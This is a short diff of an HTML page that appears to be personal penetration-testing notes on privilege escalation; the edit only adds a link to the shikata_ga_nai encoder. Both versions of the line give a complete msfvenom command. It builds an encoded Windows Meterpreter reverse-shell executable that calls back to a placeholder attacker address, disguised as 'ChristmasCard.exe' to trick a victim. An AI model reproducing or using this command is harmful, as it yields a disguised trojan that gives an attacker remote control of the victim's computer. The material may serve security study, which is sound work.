@@ -5,7 +5,7 @@
 <h1>Escalate privileges</h1>
     <h2>Create malicious file</h2>
     <ol><p><ul>
-        <a target=_blank href=https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>msfvenom</a> -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=[MY IP ADDRESS] -f exe > /home/myusername/Desktop/ChristmasCard.exe
+        <a target=_blank href=https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>msfvenom</a> -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/<a target=_blank href=https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/shikata_ga_nai.rb>shikata_ga_nai</a> -b "\x00" LHOST=[MY IP ADDRESS] -f exe > /home/myusername/Desktop/ChristmasCard.exe
     </ul>
         <ul></ul>
     </p></ol>
